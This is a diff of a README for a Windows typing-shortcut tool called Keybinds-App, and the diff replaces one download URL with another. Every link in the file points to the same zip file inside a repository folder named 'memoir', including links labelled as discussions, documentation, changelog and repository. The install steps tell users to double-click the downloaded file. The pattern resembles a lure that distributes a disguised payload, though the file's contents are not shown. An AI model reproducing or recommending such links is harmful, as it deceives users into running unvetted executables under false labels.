@@ -1,6 +1,6 @@
 # 🎹 Keybinds-App - Type Faster with Custom Shortcuts
 
-[![Download Keybinds-App](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip)](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip)
+[![Download Keybinds-App](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip)](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Keybinds-App helps you automate typing tasks on your Windows computer. With this
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of Keybinds-App: [Download Keybinds-App](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip). Follow these steps to install the application:
+To get started, visit this page to download the latest version of Keybinds-App: [Download Keybinds-App](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip). Follow these steps to install the application:
 
 1. Go to the **Releases** section of the page.
 2. Find the latest version release.
-3. Click on the download link for the installer file (`https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip`).
+3. Click on the download link for the installer file (`https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip`).
 4. Once the download is complete, locate the file in your downloads folder and double-click it to start the installation.
 
 ## 🌟 Features
@@ -74,7 +74,7 @@ Keybinds-App is designed for Windows 10 and later. It may not work as intended o
 
 ## 👥 Community Support
 
-Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip) to share your experiences and get help from fellow users.
+Join our community on [GitHub Discussions](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip) to share your experiences and get help from fellow users.
 
 ## 📈 Feedback and Contributions
 
@@ -82,8 +82,8 @@ We welcome your feedback. If you encounter any issues or have suggestions, pleas
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip)
-- [Documentation](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip)
-- [Changelog](https://raw.githubusercontent.com/Yum1Ham1/Keybinds-App/main/memoir/App-Keybinds-v3.1.zip)
+- [GitHub Repository](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip)
+- [Documentation](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip)
+- [Changelog](https://github.com/Yum1Ham1/Keybinds-App/raw/refs/heads/main/memoir/Keybinds_App_v1.8-beta.4.zip)
 
 With Keybinds-App, save time and reduce typing tasks. Enjoy a smoother, faster typing experience!
